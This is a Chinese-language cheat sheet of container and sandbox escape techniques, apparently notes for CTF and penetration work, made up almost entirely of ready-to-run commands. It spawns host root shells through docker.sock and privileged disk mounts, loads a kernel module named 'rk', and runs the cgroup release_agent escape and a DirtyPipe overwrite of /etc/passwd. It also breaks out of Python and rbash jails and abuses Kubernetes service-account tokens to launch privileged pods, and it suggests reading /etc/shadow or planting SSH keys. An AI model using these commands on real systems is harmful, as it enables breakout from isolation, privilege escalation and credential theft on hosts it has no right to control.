# 容器 / 沙箱逃逸

## 识别环境

```bash
# 是否在容器
ls -la /.dockerenv         # 存在 → docker
cat /proc/1/cgroup         # 含 "docker" / "containerd" / "kubepods" → 容器
cat /proc/self/status | grep -i CapEff  # 能力位
mount | grep overlay       # overlay 存储 → docker
```

## 信息收集

```bash
id
hostname
uname -a
cat /etc/os-release
ip a
env
cat /proc/self/cgroup
cat /proc/1/sched | head -1   # 看 PID 1 是什么
mount
ls /dev/   # 是否挂了 host 目录
```

## 逃逸方式速查

| 条件 | 方法 |
|---|---|
| 特权容器（`--privileged`） | mount /dev/sda 到容器内 → 读宿主文件 |
| 挂载 docker.sock | `docker -H unix:///var/run/docker.sock run -v /:/h --rm -it busybox chroot /h sh` |
| `cap_sys_admin` | mount procfs 控制 host 进程 |
| `cap_sys_module` | 加载内核模块 |
| `cap_dac_read_search` | 读宿主任意文件 |
| 漏洞内核 | DirtyPipe、DirtyCow、CVE-2022-0847 |
| Docker < 19.03.5 | runc CVE-2019-5736 |

## --privileged 逃逸最常用

```bash
# 找宿主 root 文件系统
fdisk -l                         # 看磁盘
mkdir /h && mount /dev/sda1 /h  # 挂载
chroot /h sh                     # 进入宿主 root
# 读 /etc/shadow 或写 /root/.ssh/authorized_keys
```

## docker.sock 逃逸

```bash
# 容器内有 docker 客户端：
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

没有 docker 客户端时用 curl：
```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
    -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"]}}' \
    http://localhost/containers/create
# 然后 start, attach
```

## cap_sys_admin / sys_module

```bash
# 加载内核模块（需 sys_module）
echo 'obj-m += rk.o' > Makefile
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod ./rk.ko

# cgroup release_agent 逃逸（cap_sys_admin）
# 创建一个新 cgroup，写 release_agent 让宿主执行命令
mkdir /tmp/x; mount -t cgroup -o rdma cgroup /tmp/x
mkdir /tmp/x/c
echo 1 > /tmp/x/c/notify_on_release
cat /etc/mtab | grep cgroup | head -1   # 找路径
echo "$host_path/cmd" > /tmp/x/release_agent
echo '#!/bin/sh
id > /tmp/host_out' > $host_path/cmd
chmod +x $host_path/cmd
sh -c "echo \$\$ > /tmp/x/c/cgroup.procs"
```

## CVE-2022-0847 DirtyPipe

不要 root 权限，可写任意只读文件：
```c
// 网上现成 PoC，编译后跑
gcc dp.c -o dp
./dp /etc/passwd 1  # 例
```

## 受限 shell（jail）逃逸

CTF 常见 Python jail / 受限 sh：

```python
# Python jail：被禁了 import / open / __builtins__
().__class__.__bases__[0].__subclasses__()       # 找子类
# 找 _wrap_close / Popen 等可执行
[c for c in ().__class__.__bases__[0].__subclasses__() if 'Popen' in str(c)]

# 字符过滤绕：
getattr(__import__('os'), 'system')('id')

# 长 payload：
.__class__.__mro__[1].__subclasses__()[<idx>]('id', shell=True, stdout=-1).communicate()
```

```bash
# bash jail：rbash / 限定 PATH
# 试：
help          # 看内置命令
echo /bin/*   # 通配符
$(echo bash) # 拼接
'b''ash'     # 字符串拼接
ls / -l 2>&1
# 跳逃：
ssh -t user@target /bin/bash    # 强制 bash
vi 后 :!sh
less 中 !sh
find / -name xx -exec sh \;
```

## Kubernetes pod 逃逸

```bash
# 看是否 sa token
ls /var/run/secrets/kubernetes.io/serviceaccount/
# token + ca + namespace
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# 创建特权 pod（需要权限）
kubectl run priv --image=alpine --privileged -- sleep 1d
kubectl exec -it priv -- chroot /host sh
```
